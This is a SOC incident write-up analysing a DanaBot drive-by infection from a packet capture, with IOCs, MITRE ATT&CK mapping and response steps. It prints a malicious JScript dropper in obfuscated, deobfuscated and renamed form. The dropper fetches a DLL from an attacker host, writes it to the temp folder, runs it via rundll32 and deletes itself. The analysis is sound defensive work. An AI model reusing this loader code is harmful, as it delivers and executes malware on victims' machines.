# Incident Summary
a local machine with an IP address of `10.2.14.101` has fallen victim to a Drive-by compromise, the infected machine accesed `hxxp://portfolio[.]serveirc[.]com` with IP address of `62.173.142.148 ` which enabled a JavaScript file to be downloaded called `allegato_708.js` which had an obfuscated JavaScript code which downloaded a file called `resources.dll` from `hxxp://soundata.top/resources.dll`, wrote it into a random dll to evade detection rules then executed the .dll file using `rundll32.exe`. According to TI sources. The behavior and extracted IOCs refer to the  `DanaBot malware family`; further investigations have been made to ensure the extraction of all the behavioral patterns to be fed to a detection rule to enhance the security posture.
# Business Impact 
DanaBot malware is known for being an information-stealing malware that exfiltrates users' data. This could affect the data confidentiality and lead to unauthorized access to users' accounts.
# Investigation Methodology
1. Opened the pcap file and filtered conversations by packet size.
2. Queried HTTP methods found in the pcap file.
3. Identified `allegato_708.js` and acquired obfustcated js code.
4. De-obfuscate the JS code to reveal the C2 domain and command ran to execute the alleged malware logic.
5. Confirmed the successful communication of the C2 domain `hxxp://soundata.top/resources.dll` from the pcap.
6. Confirmed data exfiltration through the IP `195.133.88.98`.
# IOCs (Indicators of Compromise)
| Type       | Value        | Description                                |
| :--------- | :----------- | :----------------------------------------- |
| **IP address** | `10.2.14.101` | IP address of Victim local machine |
| **IP address** | `62.173.142.148` | IP address of the initially accessed website that enabled the suspicious JS code |
| **SHA256 HASH** | `847b4ad90b1daba2d9117a8e05776f3f902dda593fb1252289538acf476c4268` | Hash of `allegato_708.js` file which contained the suspicious JS code|
| **IP address** | `195.133.88.98` | IP address of Command and control server used to download the suspicious DLL file and exfiltrate data |
| **SHA256 HASH** | `2597322A49A6252445CA4C8D713320B238113B3B8FD8A2D6FC1088A5934CEE0E` | Hash of the suspicious DLL file|
| **Windows System Process** | `wscript.exe` | System process used hosts the script `resources.dll` |
| **Windows System Process** | `rundll32.exe` | Live of the land process used to evade defenses and run the suspicious DLL file |
# Analysis & MITRE ATT&CK Mapping
## Analysis 
After obtaining the pcap file, I searched for the HTTP methods and observed a `GET` request done from a local machine with IP address `10.2.14.101` to `62.173.142.148`. After running a reputation scan via Virus Total, the reputation is 15/93; however, it's not guaranteed to be malicious until I see the response from `62.173.142.148` containing this obfuscated JS code
<details>
<summary> Click here to see the full obfuscated JS code</summary>
  
```JS
function _0x23c2() {
  var _0xac67d2 = [
    "a8k3odVdVaBcHh/dUmoMWRBdK8kS",
    "W6XeW43cPJWvWQ/cGhykW5FcQ3O",
    "WOa1eupdOSkXWROVjCoMbLldTNq",
    "WQWlk2mA",
    "j8ocW6xcJ0hdNCoJW4RcPsRdVmo6kW",
    "pmk+dmk5W6qEW67dOMi",
    "ECo8WPZdNmojb37dQSoLe8kIja",
    "tmopD8k7W7a1W4VdSLeMuCoNWP1VW5pcVgehWPzkB3hdKKSpnatdICkRoIxdT1O/W6Tzru3dMmoBmCkfW6xcNmkdW6ZdJ8oWCSklWQ/dVG",
    "AcXXvd0E",
    "W5hcUaxcQZFdG8khp13dMezGeG",
    "gSkFWPRdN8kLrCkMdq",
    "kSoWqSkCqmobWRhcGtCsjYm",
    "WPKzWQCXWOhdTmo/",
    "W6uSb8o4z8oHxbVcRfNdICou",
    "W5JcIImOW57cRCoOhJO",
    "jKJcOIerWOhcMaXtd01a",
    "W69bW4pcOtWAWQNcRLm+W6tcQ2e",
    "WQvGi8kdW59hjSkCsx3cRCkR",
    "vCozW4/cRCkEWQRdS8onFsTaWPRcJCoru8o6",
    "W7TtCJvFwHeFW53dSrjc",
    "BXinydldQ8oeWQpdK15tW7pcVq",
    "wCo0rmkA",
    "WQVdH1zWwcldI8kmnNpdSCoUWO0",
    "p2OrWOqWWRS",
    "W7iWWQu2",
    "g3K9WPC",
    "WPS6amoPESo7",
    "n2rUfXKj",
    "lSkTamkgb8o2W7tcH8ktqSkAWOSIWQXnW6u",
    "W6fVuXRcPSo3W4Wio8o4exJdSa",
    "W6XdW4FcOtGAWQ7cRuCyW6RcMxC",
    "W6qOaSoTxmoGArFcGLm",
    "ASkXW5aoWQS",
    "qmoEBmkYW7LbWQldOLuGuSo/WOrX",
    "W6VcUv0vELW+WQ8yfCkbW4S",
    "BSkGW4StWR7cRg1RzCo+WPjfeSoNW4LfF8k7mwrDiJVdTf7cQW",
    "eSofqmkq",
    "W6hcGmkYmLHeWRJdNfuiW4jrqCkVzmkHhmknWPz/W6pcNJ/dRSoSW4WSpNn2WPiGW5a",
    "W7HEDdXCuxqpW6hdUqrWW5K",
    "W4pdVrDzWPJcMmkvmZefcNS",
    "W5/dJfJdUMZcT8o2",
    "g0qgkvtdTG",
    "AXWozJVdQ8kKWQNdQwPRW5m",
    "ueNcGq",
    "W4neW7ZcHLJdJ8kTBmkqW7HAt28",
    "iSktWPxcO8k5y0WHsce",
    "E8k3WQG+W5e",
    "yCoKCMFcUeRdMxtdM8kDWRNdR8kzqmoPWQ87W5aAWR1woH7cRCoxW6S",
    "gwbR",
    "fhfLhG",
  ];
  _0x23c2 = function () {
    return _0xac67d2;
  };
  return _0x23c2();
}
var _0x10ab20 = _0x57c2;
(function (_0x562920, _0x324070) {
  var _0x4c8674 = _0x57c2,
    _0x538a6a = _0x562920();
  while (!![]) {
    try {
      var _0x385777 =
        parseInt(_0x4c8674(0x158, "XkeN")) / 0x1 +
        parseInt(_0x4c8674(0x12e, "[%Fm")) / 0x2 +
        -parseInt(_0x4c8674(0x142, "XkeN")) / 0x3 +
        parseInt(_0x4c8674(0x13e, "O%ju")) / 0x4 +
        -parseInt(_0x4c8674(0x14b, "xQOj")) / 0x5 +
        (parseInt(_0x4c8674(0x133, "A4&G")) / 0x6) *
          (parseInt(_0x4c8674(0x150, "dK59")) / 0x7) +
        (-parseInt(_0x4c8674(0x156, "(Q&R")) / 0x8) *
          (parseInt(_0x4c8674(0x132, "OlYg")) / 0x9);
      if (_0x385777 === _0x324070) break;
      else _0x538a6a["push"](_0x538a6a["shift"]());
    } catch (_0x2d274b) {
      _0x538a6a["push"](_0x538a6a["shift"]());
    }
  }
})(_0x23c2, 0x54a3a);
function _0x414360(_0x5c5160) {
  var _0x567e59 = _0x57c2,
    _0x119065 = "",
    _0x4f008b = _0x567e59(0x135, "A4&G"),
    _0x5a393f = _0x4f008b[_0x567e59(0x149, "w@FV")];
  for (var _0x3d45b7 = 0x0; _0x3d45b7 < _0x5c5160; _0x3d45b7++) {
    _0x119065 += _0x4f008b[_0x567e59(0x157, "*rdb")](
      Math[_0x567e59(0x131, "sRMv")](
        Math[_0x567e59(0x145, "GKs8")]() * _0x5a393f,
      ),
    );
  }
  return _0x119065 + _0x567e59(0x147, "5%8N");
}
var _0x23d4f8 = _0x10ab20(0x153, "%$(b"),
  _0x48a85a = _0x414360(0xa),
  _0x44bdd9 =
    new ActiveXObject(_0x10ab20(0x151, "V6of"))[_0x10ab20(0x14a, "^5PL")](0x2) +
    "\x5c" +
    _0x48a85a,
  _0x5da57f = WScript[_0x10ab20(0x134, "oGec")](_0x10ab20(0x14f, "A4&G"));
function _0x57c2(_0x11e4af, _0x54a6eb) {
  var _0x23c29e = _0x23c2();
  return (
    (_0x57c2 = function (_0x57c28d, _0x19268b) {
      _0x57c28d = _0x57c28d - 0x128;
      var _0x26c549 = _0x23c29e[_0x57c28d];
      if (_0x57c2["VLfCmI"] === undefined) {
        var _0x9ab1c1 = function (_0x49a20c) {
          var _0x3b5c63 =
            "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=";
          var _0xcdecf3 = "",
            _0x16e53d = "";
          for (
            var _0x39434a = 0x0, _0x3cb912, _0x118fbd, _0x4e12df = 0x0;
            (_0x118fbd = _0x49a20c["charAt"](_0x4e12df++));
            ~_0x118fbd &&
            ((_0x3cb912 =
              _0x39434a % 0x4 ? _0x3cb912 * 0x40 + _0x118fbd : _0x118fbd),
            _0x39434a++ % 0x4)
              ? (_0xcdecf3 += String["fromCharCode"](
                  0xff & (_0x3cb912 >> ((-0x2 * _0x39434a) & 0x6)),
                ))
              : 0x0
          ) {
            _0x118fbd = _0x3b5c63["indexOf"](_0x118fbd);
          }
          for (
            var _0x42daf9 = 0x0, _0x4f2d07 = _0xcdecf3["length"];
            _0x42daf9 < _0x4f2d07;
            _0x42daf9++
          ) {
            _0x16e53d +=
              "%" +
              ("00" + _0xcdecf3["charCodeAt"](_0x42daf9)["toString"](0x10))[
                "slice"
              ](-0x2);
          }
          return decodeURIComponent(_0x16e53d);
        };
        var _0x1be13e = function (_0x43cbd0, _0x5e5510) {
          var _0x14b9a0 = [],
            _0x24e5cd = 0x0,
            _0x5c44af,
            _0x5c1992 = "";
          _0x43cbd0 = _0x9ab1c1(_0x43cbd0);
          var _0x363895;
          for (_0x363895 = 0x0; _0x363895 < 0x100; _0x363895++) {
            _0x14b9a0[_0x363895] = _0x363895;
          }
          for (_0x363895 = 0x0; _0x363895 < 0x100; _0x363895++) {
            ((_0x24e5cd =
              (_0x24e5cd +
                _0x14b9a0[_0x363895] +
                _0x5e5510["charCodeAt"](_0x363895 % _0x5e5510["length"])) %
              0x100),
              (_0x5c44af = _0x14b9a0[_0x363895]),
              (_0x14b9a0[_0x363895] = _0x14b9a0[_0x24e5cd]),
              (_0x14b9a0[_0x24e5cd] = _0x5c44af));
          }
          ((_0x363895 = 0x0), (_0x24e5cd = 0x0));
          for (
            var _0x46ed8b = 0x0;
            _0x46ed8b < _0x43cbd0["length"];
            _0x46ed8b++
          ) {
            ((_0x363895 = (_0x363895 + 0x1) % 0x100),
              (_0x24e5cd = (_0x24e5cd + _0x14b9a0[_0x363895]) % 0x100),
              (_0x5c44af = _0x14b9a0[_0x363895]),
              (_0x14b9a0[_0x363895] = _0x14b9a0[_0x24e5cd]),
              (_0x14b9a0[_0x24e5cd] = _0x5c44af),
              (_0x5c1992 += String["fromCharCode"](
                _0x43cbd0["charCodeAt"](_0x46ed8b) ^
                  _0x14b9a0[
                    (_0x14b9a0[_0x363895] + _0x14b9a0[_0x24e5cd]) % 0x100
                  ],
              )));
          }
          return _0x5c1992;
        };
        ((_0x57c2["Gcvrzi"] = _0x1be13e),
          (_0x11e4af = arguments),
          (_0x57c2["VLfCmI"] = !![]));
      }
      var _0x178ebd = _0x23c29e[0x0],
        _0x14ddc7 = _0x57c28d + _0x178ebd,
        _0x2a1ef9 = _0x11e4af[_0x14ddc7];
      return (
        !_0x2a1ef9
          ? (_0x57c2["BCBEPx"] === undefined && (_0x57c2["BCBEPx"] = !![]),
            (_0x26c549 = _0x57c2["Gcvrzi"](_0x26c549, _0x19268b)),
            (_0x11e4af[_0x14ddc7] = _0x26c549))
          : (_0x26c549 = _0x2a1ef9),
        _0x26c549
      );
    }),
    _0x57c2(_0x11e4af, _0x54a6eb)
  );
}
(_0x5da57f[_0x10ab20(0x12d, "w@FV")](_0x10ab20(0x12c, "XkeN"), _0x23d4f8, ![]),
  _0x5da57f[_0x10ab20(0x146, "B[vm")]());
if (_0x5da57f[_0x10ab20(0x136, "t2ew")] == 0xc8) {
  var _0x3c8952 = WScript[_0x10ab20(0x139, "RdnH")](_0x10ab20(0x155, "6N7O"));
  (_0x3c8952[_0x10ab20(0x152, "1GKJ")](),
    (_0x3c8952[_0x10ab20(0x143, "A4&G")] = 0x1),
    _0x3c8952[_0x10ab20(0x14e, "V6of")](_0x5da57f[_0x10ab20(0x13b, "h*Z]")]),
    (_0x3c8952[_0x10ab20(0x138, "JDok")] = 0x0),
    _0x3c8952[_0x10ab20(0x14d, "h*Z]")](_0x44bdd9, 0x2),
    _0x3c8952[_0x10ab20(0x12a, "DYtC")]());
  var _0x1e16b0 = WScript[_0x10ab20(0x13f, "]o#z")](_0x10ab20(0x144, "o]7W"));
  _0x1e16b0[_0x10ab20(0x159, "^n!v")](
    _0x10ab20(0x140, "1^^k") + _0x44bdd9 + _0x10ab20(0x148, "h*Z]"),
    0x0,
    !![],
  );
}
new ActiveXObject(_0x10ab20(0x12b, "[%Fm"))[_0x10ab20(0x129, "$$(i")](
  WScript[_0x10ab20(0x130, "xQOj")],
);
```
</details>
so I used a tool called <a href="https://obf-io.deobfuscate.io/">Obfuscator.io Deobfuscator</a> and here's the output

```JS
function _0x414360(_0x5c5160) {
  var _0x119065 = '';
  var _0x5a393f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
  for (var _0x3d45b7 = 0x0; _0x3d45b7 < _0x5c5160; _0x3d45b7++) {
    _0x119065 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * _0x5a393f));
  }
  return _0x119065 + ".dll";
}
var _0x48a85a = _0x414360(0xa);
var _0x44bdd9 = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(0x2) + "\\" + _0x48a85a;
var _0x5da57f = WScript.CreateObject("MSXML2.XMLHTTP");
_0x5da57f.Open("GET", "http://soundata.top/resources.dll", false);
_0x5da57f.Send();
if (_0x5da57f.Status == 0xc8) {
  var _0x3c8952 = WScript.CreateObject("ADODB.Stream");
  _0x3c8952.Open();
  _0x3c8952.Type = 0x1;
  _0x3c8952.Write(_0x5da57f.ResponseBody);
  _0x3c8952.Position = 0x0;
  _0x3c8952.SaveToFile(_0x44bdd9, 0x2);
  _0x3c8952.Close();
  var _0x1e16b0 = WScript.CreateObject("Wscript.Shell");
  _0x1e16b0.Run("rundll32.exe /B " + _0x44bdd9 + ",start", 0x0, true);
}
new ActiveXObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName);
```
for investigation purposes I have cleaned the code's variable names to give a clearer picture of what it really is 
```JS
function _create_dll_function(_0x5c5160) {
var _dll_name_dropped = '';
var _0x5a393f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
for (var _0x3d45b7 = 0x0; _0x3d45b7 < _0x5c5160; _0x3d45b7++) {
_dll_name_dropped += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * _0x5a393f));
}
return _dll_name_dropped + ".dll";
}
var _called_dll_function_name = _create_dll_function(0xa);
var _dll_created_by_function = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(0x2) + "\\" + _called_dll_function_name;
var _C2 = WScript.CreateObject("MSXML2.XMLHTTP");
_C2.Open("GET", "http://soundata.top/resources_dll", false);
_C2.Send();
if (_C2.Status == 200) {
var _resources_dll = WScript.CreateObject("ADODB.Stream");
_resources_dll.Open();
_resources_dll.Type = 0x1;
_resources_dll.Write(_C2.ResponseBody);
_resources_dll.Position = 0x0;
_resources_dll.SaveToFile(_dll_created_by_function, 0x2);
_resources_dll.Close();
var _wscript_object = WScript.CreateObject("Wscript.Shell");
_wscript_object.Run("rundll32.exe /B " + _dll_created_by_function + ",start", 0x0, true);
}
new ActiveXObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName);
```
The JS code begins by generating a randomized alphanumeric string to serve as a filename, obfuscating the payload on the disk. It uses the MSXML2.XMLHTTP object to download a binary payload (resources.dll) from the C2 domain `soundata.top`. The file is written to the user's `%TEMP%` directory via an `ADODB.Stream` object. Finally, the script executes the dropped DLL using `WScript.Shell` to provoke `rundll32.exe`, invoking the exported function start.
## MITRE ATT&CK mapping 
Inital Access (TA0001) &rarr; Drive-by Compromise T1189.  
Defense Evasion (TA0005) &rarr; Obfuscated Files or Information: Command Obfuscation T1027.010.  
Defense Evasion (TA0005) &rarr; System Binary Proxy Execution: Rundll32 T1218.011.  
Command and Control (TA0011) &rarr; Ingress Tool Transfer T1105.  
Execution (TA0002) &rarr; Command and Scripting Interpreter: JavaScript T1059.007.  
# Verdict
Verdict: Needs Investigation through EDR logs to determine the scope of downloaded DLL file.
Confidence : High. 
This incident is mapped to Intial Access, Defense Evasion and Execution Techniques,However the actual payload executed by `resources.dll` cannot be confirmed through pcap file and needs investigation on the infected host `10.2.14.101` to determine the Actions on objective
# Recommended Next Actions
**Escalate to T2**
Suggesting the following steps: 
1. Isolate the infected machine `10.2.14.101`
2. search the EDR logs for anamolies after the `rundll32.exe` command.
3. use the IOCs to determine the scope of infection
4. remove any persistence key registers from the infected machine.
5. Develop Detection rules to detect `rundll32.exe` runing from `%TEMP` directory
